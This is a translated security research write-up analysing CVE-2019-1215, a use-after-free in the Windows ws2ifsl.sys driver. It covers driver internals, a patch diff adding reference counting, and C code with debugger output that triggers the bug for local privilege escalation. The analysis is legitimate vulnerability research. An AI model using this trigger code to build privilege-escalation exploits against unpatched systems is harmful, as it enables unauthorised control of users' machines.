# CVE-2019-1215：Windows内核ws2ifsl.sys中UAF漏洞分析
##### 译文声明
本文是翻译文章，文章原作者 bluefrostsecurity，文章来源：labs.bluefrostsecurity.de
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
## 简介
这篇文章主要介绍ws2ifsl.sys中最近修补的UAF漏洞（CVE-2019-1215），这个漏洞可用于本地特权提升。该漏洞存在于Windows
7、Windows 8、Windows 10、Windows 2008、Windows 2012和Windows
2019中，已于2019年9月10日进行了修补。
这篇文章描述了Windows 10 19H1 (1903) x64上的具体原因分析和利用。这个exploit演示了如何绕过kASLR、kCFG和SMEP。
## 关于ws2ifsl
为了更好的理解这个分析，我们必须介绍一些关于这个驱动程序的背景信息。没有关于这个驱动程序的公开文档，以下大部分信息都是逆向的。ws2ifsl组件是一个与winsocket相关的驱动程序。
驱动程序实现两个对象：
  * 一个进程对象
  * 一个socket对象
这个驱动实现了几个派遣函数，当调用NtCreateFile时，文件名设置为`\Device\WS2IFSL\`，将调用DispatchCreate函数，函数将根据文件名中的`_FILE_FULL_EA_INFORMATION.EaName`字符串进行判断，如果是NifsPvd，它将调用CreateProcessFile，如果是NifsSct，它将调用CreateSocketFile。
CreateSocketFile和CreateProcessFile函数都创建内部对象，称为“procData”和“socketData”。创建后，这些对象将保存在文件对象的`_FILE_OBJECT.FsContext`中，这个文件对象是在dispatch
routine中创建的。
文件对象可以在用户模式中访问从NtCreateFile返回的句柄对象。该句柄可用于执行DeviceIoControl或调用WriteFile。也就是说“procData”和“sockedData”对象没有直接引用`ObfReferenceObject`和`ObfDereferenceObject`，而是引用了底层的文件对象。
驱动程序实现了两个APC对象，分别称为’request queue’和’cancel
queue’。APC机制是在另一个线程中异步执行函数。因为可以在另一个线程中强制执行多个apc，所以内核实现了一个队列，其中存储所有要执行的apc。
“procData”对象包含这两个APC对象，由CreateProcessFile在initializerqueue和InitializeCancelQueue中初始化。一个APC对象由`KeInitializeApc`初始化，并接收一个目标线程和一个函数作为参数。此外，还设置了处理器模式（内核或用户模式）以及RundownRoutine。如果是ws2ifsl，则RundownRoutine为
RequestRundownRoutine和
CancelRundownRoutine，则处理器模式设置为用户模式。这些RundownRoutine用于清理，如果线程有机会在APC内部执行之前死亡，则由内核调用。之所以会发生这种情况，是因为仅当APC设置为alertable状态时，才进入线程内执行它。例如，如果调用SleepEx时第二个参数设置为TRUE，则可以将线程设置为alertable状态。
驱动程序还在DispatchReadWrite中实现了一个读写dispatch
routine，只能socket对象可访问，并调用DoSocketReadWrite。这个函数通过调用SignalRequest函数使用`nt!KeInsertQueueApc`函数将APC元素添加到APC队列中。
###  与驱动通信
在许多情况下，驱动程序会创建符号链接，并且其名称可用作CreateFileA的文件名
，但是ws2ifsl不是这样。它只能在`nt!IoCreateDevice`的DeviceName设置为
‘DeviceWS2IFSL’的情况下进行调用。但是，通过调用本地API
NtOpenFile，就可以访问派遣函数ws2ifsl!DispatchCreate。以下代码可完成此操作：
    HANDLE fileHandle = 0;
    UNICODE_STRING deviceName;
    RtlInitUnicodeString(&deviceName, (PWSTR)L"\Device\WS2IFSL");
    OBJECT_ATTRIBUTES object;
    InitializeObjectAttributes(&object, &deviceName, 0, NULL, NULL);
    IO_STATUS_BLOCK IoStatusBlock ;
    NtOpenFile(&fileHandle, GENERIC_READ, &object, &IoStatusBlock, 0, 0);
DispatchCreate函数将检查打开调用的扩展属性。此属性只能通过NtCreateFile系统调用设置。
对于process对象，扩展属性(ea)数据缓冲区必须包含一个属于当前进程的线程句柄，然后我们就有一个设备句柄，可以使用它来做进一步的操作。
## 补丁分析
介绍了背景知识，我们可以进行补丁分析。补丁分析首先对比ws2ifsl未修补版本(10.0.18362.1)和修补版本(10.0.18362.356)。
可以看到修补的函数：
  * CreateProcessFile
  * DispatchClose
  * SignalCancel
  * SignalRequest
  * RequestRundownRoutine
  * CancelRundownRoutine
在以下截图中可以看到：
修补后的版本还包含一个新功能:
  * DereferenceProcessContext
最明显的变化是，所有改变的函数都包含对新函数DereferenceProcessContext的调用，如下图所示:
接下来要注意的是’procData’对象扩展了一个新成员，现在使用引用计数。例如，在负责所有初始化的CreateProcessFile中，这个新成员被设置为1。
    procData->tag = 'corP';
    *(_QWORD *)&procData->processId = PsGetCurrentProcessId();
    procData->field_100 = 0;
vs
    procData->tag = 'corP';
    *(_QWORD *)&procData->processId = PsGetCurrentProcessId();
    procData->dword100 = 0;
    procData->referenceCounter = 1i64; // new
DereferenceProcessContex函数检查引用计数，并调用nt!ExFreePoolWithTag返回。
DispatchClose函数也打补丁了，新版本将调用从nt!ExFreePoolWithTag改变到DereferenceProcessContext,这表示，有时（如果引用计数不是零）“procData”不会被释放，只会将其引用计数递减一。
SignalRequest中的修复会在调用`nt!KeInsertQueueApc`之前增加referenceCounter。
BUG在于DispatchClose函数可以释放“procData”对象，即使请求一个已在队列中的APC。每当关闭文件句柄的最后一个引用时(通过调用CloseHandle)，就会调用DispatchClose函数。
补丁通过使用新的referenceCounter来确保缓冲区只有在最后一个引用被删除之后才会被释放。如果是RundownRoutine（包含引用），则在函数末尾删除
DereferenceProcessContext引用。并在调用`nt!KeInsertQueueApc`之前增加引用计数。如果发生错误（可能nt!KeInsertQueueApc会失败），该引用也会被删除（避免内存泄漏）。
###  触发bug
要触发这个bug，只需创建一个“procData”句柄和一个“socketData”句柄，向“socketData”写入一些数据并关闭两个句柄。
线程终止调用APC RundownRoutine，将处理释放的数据。以下代码将触发该BUG：
    in CreateProcessHandle:
        g_hThread1 = CreateThread(0, 0, ThreadMain1, 0, 0, 0);
        eaData->a1 = (void*)g_hThread1; // thread must be in current process
        eaData->a2 = (void*)0x2222222;  // fake APC Routine
        eaData->a3 = (void*)0x3333333;  // fake cancel Rundown Routine
        eaData->a4 = (void*)0x4444444;
        eaData->a5 = (void*)0x5555555;
        NTSTATUS status = NtCreateFile(&fileHandle, MAXIMUM_ALLOWED, &object, &IoStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN_IF, 0, eaBuffer, sizeof(FILE_FULL_EA_INFORMATION) + sizeof("NifsPvd") + sizeof(PROC_DATA));
        DWORD supSuc = SuspendThread(g_hThread1);
    in main:
    HANDLE procHandle = CreateProcessHandle();
    HANDLE sockHandle = CreateSocketHandle(procHandle);
    char* writeBuffer = (char*) malloc(0x100);
    IO_STATUS_BLOCK io;
    LARGE_INTEGER byteOffset;
    byteOffset.HighPart = 0;
    byteOffset.LowPart = 0;
    byteOffset.QuadPart = 0;
    byteOffset.u.LowPart = 0;
    byteOffset.u.HighPart = 0;
    ULONG key = 0; 
    CloseHandle(procHandle);
    NTSTATUS ret = NtWriteFile(sockHandle, 0, 0, 0, &io, writeBuffer, 0x100, &byteOffset, &key);
可以在DispatchClose释放处下一个断点来验证：
    Breakpoint 2 hit
    ws2ifsl!DispatchClose+0x7d:
    fffff806`1b8e71cd e8ceeef3fb      call    nt!ExFreePool (fffff806`178260a0)
    1: kd> db rcx
    ffffae0d`ceafbc70  50 72 6f 63 00 00 00 00-8c 07 00 00 00 00 00 00  Proc............
    1: kd> g
    Breakpoint 0 hit
    ws2ifsl!RequestRundownRoutine: